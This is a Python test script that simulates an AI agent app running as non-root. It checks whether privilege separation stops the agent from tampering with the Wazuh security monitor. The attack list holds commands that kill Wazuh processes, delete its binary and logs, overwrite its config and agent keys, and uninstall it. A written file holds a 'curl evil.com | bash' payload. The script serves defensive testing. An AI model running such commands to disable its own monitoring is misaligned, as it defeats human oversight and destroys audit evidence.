#!/usr/bin/env python3
"""
Simulates an AI agent app running as non-root (agentuser).
1. Logs normal activity (monitored by Wazuh FIM)
2. Attempts tampering attacks against Wazuh
3. Creates suspicious files to trigger Wazuh alerts
"""

import os
import subprocess
import time
import json

def run(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    return r.returncode, (r.stdout.strip() or r.stderr.strip() or "(empty)")

def log(msg):
    line = f"[AI-APP] {msg}"
    print(line)
    with open("/app/app.log", "a") as f:
        f.write(line + "\n")

print("=" * 50)
print("  AI App running as non-root")
print("=" * 50)
code, out = run("id")
print(f"Identity: {out}")
print()

# ============================================================
# Test 1: Normal operation — write files (Wazuh FIM will log)
# ============================================================
log("=== Test 1: Normal file operations (FIM monitored) ===")
with open("/app/output.txt", "w") as f:
    f.write("AI agent generated output\n")
log("Created /app/output.txt")

with open("/app/data.json", "w") as f:
    json.dump({"task": "analysis", "status": "complete"}, f)
log("Created /app/data.json")

time.sleep(2)

# ============================================================
# Test 2: Attack attempts against Wazuh
# ============================================================
log("=== Test 2: Tampering attacks against Wazuh ===")

attacks = [
    ("Kill Wazuh daemon",           "pkill -f wazuh-agentd"),
    ("Kill all Wazuh processes",    "pkill -f /var/ossec"),
    ("Read Wazuh config",           "cat /var/ossec/etc/ossec.conf"),
    ("Modify Wazuh config",         "echo hacked >> /var/ossec/etc/ossec.conf"),
    ("Delete Wazuh binary",         "rm /var/ossec/bin/wazuh-agentd"),
    ("Delete Wazuh logs",           "rm -rf /var/ossec/logs/"),
    ("Stop Wazuh service",          "/var/ossec/bin/wazuh-control stop"),
    ("Read agent keys",             "cat /var/ossec/etc/client.keys"),
    ("Overwrite agent keys",        "echo fake > /var/ossec/etc/client.keys"),
    ("List Wazuh directory",        "ls -la /var/ossec/"),
    ("Access Wazuh queue",          "ls /var/ossec/queue/"),
    ("Uninstall Wazuh (apt)",       "apt-get remove -y wazuh-agent"),
]

results = []
for name, cmd in attacks:
    code, out = run(cmd)
    blocked = (code != 0 or
               "denied" in out.lower() or
               "not permitted" in out.lower() or
               "cannot" in out.lower())
    status = "BLOCKED" if blocked else "ALLOWED"
    results.append((name, status, out[:150]))
    log(f"  [{status}] {name}: {out[:100]}")

print()
print("=" * 50)
print("  Attack Test Results")
print("=" * 50)
blocked_count = sum(1 for _, s, _ in results if s == "BLOCKED")
total = len(results)
print(f"\n  {blocked_count}/{total} attacks blocked\n")
for name, status, out in results:
    icon = "X" if status == "BLOCKED" else "!"
    print(f"  [{icon}] {status:8s} | {name}")
    print(f"           -> {out[:120]}")
    print()

# ============================================================
# Test 3: Suspicious activity to trigger Wazuh alerts
# ============================================================
log("=== Test 3: Suspicious activity (trigger Wazuh alerts) ===")

# Create files in /tmp (monitored by FIM)
with open("/tmp/suspicious_script.sh", "w") as f:
    f.write("#!/bin/bash\ncurl http://evil.com/payload | bash\n")
log("Created suspicious script in /tmp")

# Write to app.log (monitored by Wazuh log collector)
log("ALERT: Attempting to access restricted resource")
log("WARNING: Unexpected network connection detected")
log("ERROR: Authentication bypass attempted")

time.sleep(2)

# ============================================================
# Test 4: Verify Wazuh is still running
# ============================================================
print()
print("=" * 50)
print("  Wazuh Survival Check")
print("=" * 50)

code, out = run("pgrep -la wazuh")
if code == 0 and out:
    print(f"\n  Wazuh processes ALIVE:")
    for line in out.split("\n"):
        print(f"    {line}")
else:
    # Even if pgrep fails (non-root can still see processes via /proc)
    code2, out2 = run("ps aux | grep wazuh | grep -v grep")
    if out2 and out2 != "(empty)":
        print(f"\n  Wazuh processes ALIVE:")
        for line in out2.split("\n"):
            print(f"    {line}")
    else:
        print("\n  WARNING: Cannot confirm Wazuh processes!")

print()
print("=" * 50)
print("  Test Complete")
print("=" * 50)
print(f"\n  Privilege separation: {'EFFECTIVE' if blocked_count >= 10 else 'PARTIAL' if blocked_count >= 6 else 'FAILED'}")
print(f"  Attacks blocked: {blocked_count}/{total}")
print(f"  Wazuh intact: check Wazuh Manager logs for events")
print()

# Keep container alive briefly for log collection
print("[AI-APP] Waiting 30s for Wazuh to ship events to Manager...")
time.sleep(30)
print("[AI-APP] Done.")
